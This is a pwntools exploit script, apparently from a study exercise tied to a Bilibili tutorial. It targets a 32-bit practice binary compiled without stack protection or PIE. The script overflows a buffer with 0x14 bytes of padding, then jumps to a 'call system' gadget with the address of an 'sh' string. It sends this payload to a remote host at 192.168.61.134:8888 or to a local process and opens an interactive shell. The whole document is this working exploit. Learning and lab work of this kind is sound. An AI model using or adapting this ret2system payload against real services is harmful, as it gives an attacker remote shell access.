'''
Author: 白银
Date: 2022-11-21 16:41:07
LastEditTime: 2022-11-21 20:34:39
LastEditors: 白银
Description: gcc question_4_3.c -m32 -fno-stack-protector -no-pie -o question_4_3_x86  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=851.4
'''

from pwn import *

set_arch = 2

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_4_3_x86'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.134", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x14  # ida看，buf和r差多少
call_sys = 0x804918F  # 使用gadget得调用call _system的地址，后面直接放参数就可以
# deadbeef = 0xdeadbeef  # func的返回地址，随意
bin_sh_addr = 0x804C02E  # ida用shift+f12找到sh，按空格，按u转换成db，直接写sh的地址

payload = flat(['a' * padding, call_sys, bin_sh_addr])

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.interactive()